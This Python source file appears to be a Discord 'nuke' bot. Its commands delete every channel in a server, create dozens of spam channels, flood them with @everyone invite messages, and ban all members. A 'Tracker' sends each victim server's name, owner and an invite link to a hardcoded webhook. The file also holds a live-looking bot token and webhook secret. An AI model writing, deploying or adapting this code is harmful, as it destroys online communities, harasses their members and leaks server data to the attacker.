import discord
from discord.ext import commands
import requests
import random
from colorama import Fore

protected_servers = [1150054509301747782, 1206286482579525692] 
owner_ids = [1203856955547058216] 

nuke_message = "@everyone https://discord.gg/GQDesK4Y"
nuke_channel_name = "FAMA69"
bot_prefix = "$"

logs = True 
log_settings = {
    'log_webhook': 'https://discord.com/api/webhooks/1207045550550032434/raX6tVLgyfVEPm70-yHeCq8wZ22HrA0kfxStSY84e-gOdr7ssFHtNfTx_h4A7JDSw0-a' # This is where the logs will be sent
}

autonuke = False 

bot_token = "MTIwNzIwMjU2NzAxMzEzODQzMg.G2OikJ.Fidt_UNwdGmFJdlrKz5bIvXydDmziQ9TuACdCg" 


client = commands.Bot(command_prefix=bot_prefix, intents=discord.Intents.all())
client.remove_command('help')

@client.event
async def on_ready():
    print(f"Logged into {client.user.name}")

@client.command()
async def help(ctx):
    embed = discord.Embed(title="Bot Commands")
    embed.description = f"""
     `{bot_prefix}invite` - Sends the bot invite link
     `{bot_prefix}banall` - Bans all members in the server.
     `{bot_prefix}nuke` - Nukes the server
     `{bot_prefix}fix` - Makes the bot leave all guilds apart from protected servers (OWNER ONLY)
    """
    await ctx.reply(embed=embed)

@client.command()
async def invite(ctx):
    url = f"https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions=8&scope=bot"
    await ctx.reply(url)

@client.command()
async def nuke(ctx):
    guild = ctx.guild
    if guild.id in protected_servers:
        await ctx.reply("This server is protected by our bot.")
        return
    else:
        pass

    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass
    
    for _ in range(40):
        try:
            await guild.create_text_channel(name=nuke_channel_name)
        except:
            pass
    
    invite = ""
    try:
        invite = await random.choice(guild.text_channels).create_invite()
    except:
        pass

    if logs == True:
        log_embed = {'title':'Joined Server', 'color':0x2596be, 'footer':
                    {'text':'Tracker', 'icon_url':'https://cdn.discordapp.com/attachments/1057915288147996682/1057915320402190336/nebula.png'}, 'fields':
                    [{'name':'Server Name', 'value':f'```{guild.name}```', 'inline':'true'},
                    {'name':'Server Members', 'value':f'```{guild.member_count} members```', 'inline':'true'},
                    {'name':'Server Invite', 'value':f'Click [here]({invite}) to join', 'inline':'true'},
                    {'name':'Server Owner', 'value':f'```{guild.owner}```', 'inline':'true'},
                    {'name':'Server Roles', 'value':f'```{len(guild.roles)} roles```', 'inline':'true'},
                    {'name':'Server Boosts', 'value':f'```{str(guild.premium_subscription_count)} boosts```', 'inline':'true'}
                    ]}
        requests.post(log_settings['log_webhook'], json={'embeds':[log_embed]})

@client.event
async def on_guild_join(guild):
    if autonuke == True:
        if guild.id in protected_servers:
            return
        else:
            pass

        for channel in guild.channels:
            try:
                await channel.delete()
            except:
                pass
        
        for _ in range(50):
            try:
                await guild.create_text_channel(name=nuke_channel_name)
            except:
                pass
        
        invite = "https://discord.gg/hh56h7hCtp"
        try:
            invite = random.choice(guild.text_channels).create_invite()
        except:
            pass

        if logs == True:
            log_embed = {'title':'Joined Server', 'color':0x2596be, 'footer':
                        {'text':'Tracker', 'icon_url':'https://cdn.discordapp.com/attachments/1057915288147996682/1057915320402190336/nebula.png'}, 'fields':
                        [{'name':'Server Name', 'value':f'```{guild.name}```', 'inline':'true'},
                        {'name':'Server Members', 'value':f'```{guild.member_count} members```', 'inline':'true'},
                        {'name':'Server Invite', 'value':f'Click [here]({invite}) to join', 'inline':'true'},
                        {'name':'Server Owner', 'value':f'```{guild.owner}```', 'inline':'true'},
                        {'name':'Server Roles', 'value':f'```{len(guild.roles)} roles```', 'inline':'true'},
                        {'name':'Server Boosts', 'value':f'```{str(guild.premium_subscription_count)} boosts```', 'inline':'true'}
                        ]}
            requests.post(log_settings['log_webhook'], json={'embeds':[log_embed]})

@client.command()
async def fix(ctx):
    if ctx.message.author.id in owner_ids:
        for guild in client.guilds:
            if guild.id in protected_servers:
                pass
            else:
                try:
                    await guild.leave()
                except:
                    pass
    else:
        await ctx.reply("This command is only for the bot owners")
        return

@client.event
async def on_guild_channel_create(channel):
    if channel.guild.id in protected_servers:
        return
    else:
        pass
    for _ in range(50):
        try:
            await channel.send(nuke_message)
        except:
            pass



@client.event
async def on_connect():
    stream = discord.Streaming(
        name="FAMA 69",
        url="https://twitch.tv/souljaboy", 
    )
    await client.change_presence(activity=stream)    
    print(f"{Fore.GREEN}Bot logged in {Fore.RED}{client.user.display_name}{Fore.BLUE}({client.user.id})") 


@client.command()
async def banall(ctx):
  guild = ctx.guild
  if guild.id in protected_servers:
    return
  else:
    author_id = ctx.message.author.id
    for user in guild.members:
      if user.id == author_id:
        pass
      else:
        try:
          await user.ban()
        except:
          pass

@client.command(pass_context=True)
@commands.cooldown(1, 600, commands.BucketType.user)
async def admin(ctx):
 guild = ctx.guild
 if guild.id in protected_servers:
    await ctx.message.delete()
    try:
        guild = ctx.guild
        role = await guild.create_role(name="asd",
                                       permissions=discord.Permissions(8),
                                       colour=discord.Colour(000000))
        authour = ctx.message.author
        await authour.add_roles(role)
    except:
        pass


client.run(bot_token)

